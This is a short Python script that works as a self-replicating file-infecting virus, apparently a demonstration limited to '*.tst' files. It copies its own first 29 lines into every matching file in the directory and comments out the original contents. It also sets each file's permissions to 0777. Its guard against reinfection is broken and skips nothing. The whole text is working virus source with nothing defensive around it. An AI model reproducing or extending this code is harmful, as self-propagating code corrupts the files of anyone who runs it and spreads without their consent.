#! /usr/bin/python3
import sys
import os
import glob

inp = open(sys.argv[0], 'r')
vrs = [line for (i, line) in enumerate(inp) if i < 29]
for item in glob.glob("*.tst"):
    inp = open(item, 'r')
    all_of_it = inp.readlines()
    inp.close()
    if any(line.find('tst') for line in all_of_it): next
    os.chmod(item, 0o0777)
    oup = open(item, 'w')
    oup.writelines(vrs)
    all_of_it = ['#' + line for line in all_of_it]
    oup.writelines(all_of_it)
    oup.close()#ciao
